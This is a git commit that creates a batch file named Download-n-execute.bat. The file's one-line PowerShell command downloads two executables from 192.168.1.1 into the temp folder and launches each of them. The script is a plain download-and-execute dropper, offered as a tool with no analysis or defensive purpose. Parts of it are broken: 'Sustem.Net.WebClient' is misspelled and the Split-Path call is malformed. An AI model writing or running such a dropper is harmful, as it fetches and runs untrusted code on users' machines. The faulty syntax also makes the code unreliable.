1edf219015ad5d826833e50b872e9e28b8280092
Talson Slayman <44098012+TSlayman@users.noreply.github.com>
2021-09-15 20:18:36 +0300

    Create Download-n-execute.bat

---
+++ Download-n-execute.bat
@@ -0,0 +1,4 @@
+@echo off
+set files='https://192.168.1.1/file1.exe','http://192.168.1.1/file2.exe'
+
+powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split -Path -Path $_ -Leaf);(New-Object Sustem.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
